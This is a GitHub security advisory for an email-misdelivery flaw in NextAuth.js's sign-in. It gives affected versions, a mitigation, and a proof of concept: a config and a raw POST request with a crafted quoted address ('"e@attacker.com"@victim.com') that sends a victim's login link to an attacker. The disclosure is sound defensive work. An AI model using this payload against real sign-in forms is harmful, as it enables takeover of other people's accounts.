# [M] NextAuthjs Email misdelivery Vulnerability

## Summary
Severity: Medium
Advisory: GHSA-5jpx-9hw9-2fx4
CWE: CWE-200
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2025-10-29
Source: https://github.com/advisories/GHSA-5jpx-9hw9-2fx4
Type: github-advisory

## Affected
- npm: `next-auth` — affected >=0 <4.24.12
- npm: `next-auth` — affected >=5.0.0-beta.0 <5.0.0-beta.30

## Details
### Summary

NextAuth.js's email sign-in can be forced to deliver authentication emails to an attacker-controlled mailbox due to a bug in `nodemailer`'s address parser used by the project (fixed in `nodemailer` **v7.0.7**). A crafted input such as:

```
"e@attacker.com"@victim.com
```

is parsed incorrectly and results in the message being delivered to `e@attacker.com` (attacker) instead of `"<e@attacker.com>@victim.com"` (the intended recipient at `victim.com`) in violation of RFC 5321/5322 semantics. This allows an attacker to receive login/verification links or other sensitive emails intended for the victim.

<h2>Affected NextAuthjs Version</h2>

≤ Version | Afftected
-- | --
4.24.11 | Yes
5.0.0-beta.29 | Yes


## POC

Example Setup showing misdelivery of email 

```jsx
import NextAuth from "next-auth"
import Nodemailer from "next-auth/providers/nodemailer"
import { PrismaAdapter } from "@auth/prisma-adapter"
import { prisma } from "@/lib/prisma"

export const { handlers, auth, signIn, signOut } = NextAuth({
  adapter: PrismaAdapter(prisma),
  providers: [
    Nodemailer({
      server: {
        host: "127.0.0.1",
        port: 1025,
        ...
      },
      from: "noreply@authjs.dev",
    }),
  ],
  pages: {
    signIn: '/auth/signin',
    verifyRequest: '/auth/verify-request',
  },
})

```

```jsx
POST /api/auth/signin/nodemailer HTTP/1.1
Accept-Encoding: gzip, deflate, br, zstd
Cache-Control: no-cache
Connection: keep-alive
Content-Length: 176
DNT: 1
Host: localhost:3000
Origin: http://localhost:3000
Pragma: no-cache
Referer: http://localhost:3000/auth/signin
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
accept: */*
accept-language: en-US,en;q=0.9,ta;q=0.8
content-type: application/x-www-form-urlencoded
sec-ch-ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
x-auth-return-redirect: 1

email=%22e%40attacker.coccm%22%40victim.com&csrfToken=90f5e6f48ab577ab011f212011862dcfe546459c23764cf891aab2d176f8d77a&callbackUrl=http%3A%2F%2Flocalhost%3A3000%2Fauth%2Fsignin
```

<img width="1247" height="1408" alt="Screenshot from 2025-10-25 21-15-25" src="https://github.com/user-attachments/assets/456968a3-14ce-42b4-b8ca-f25b9351cf0f" />
<img width="1279" height="1450" alt="Screenshot from 2025-10-25 21-14-47" src="https://github.com/user-attachments/assets/4e665b66-9bfe-43ce-abd3-97880972218f" />

# Mitigation

Update to nodemailer 7.0.7

## Credits

https://zeropath.com/  Helped identify this security issue

## References
- https://github.com/nextauthjs/next-auth/security/advisories/GHSA-5jpx-9hw9-2fx4
- https://github.com/nextauthjs/next-auth/commit/82efcf81f218aae43683f8dd2f7c260ef69b3ece
- https://github.com/nextauthjs/next-auth/commit/8f3b2c7af0fe08973a12f616517c3ec85a5cd172
- https://github.com/nextauthjs/next-auth
